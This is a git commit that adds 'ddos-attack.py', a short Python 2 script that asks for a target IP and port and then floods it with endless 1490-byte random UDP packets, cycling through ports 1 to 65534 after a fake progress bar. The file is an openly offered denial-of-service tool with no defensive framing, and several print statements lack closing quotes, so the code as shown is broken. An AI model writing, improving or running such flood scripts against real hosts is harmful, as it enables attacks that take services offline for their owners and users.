0846ee8c07ead50c7bd6d33a87609513697ba136
ohm35057 <62876566+ohm35057@users.noreply.github.com>
2020-05-26 20:19:14 +0700

    first commit

---
+++ ddos-attack.py
@@ -0,0 +1,51 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Author   : ohm35057
+print "You Tube : เสือก
+print "github   : ohm35057
+print "Facebook : เสือก
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[ อ่านหนังแปป                   ] 0% "
+time.sleep(5)
+print "[       ไทย              ] 25%"
+time.sleep(5)
+print "[   Eng        ] 50%"
+time.sleep(5)
+print "[      วิทย์    ] 75%"
+time.sleep(5)
+print "[         คณิต      ] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
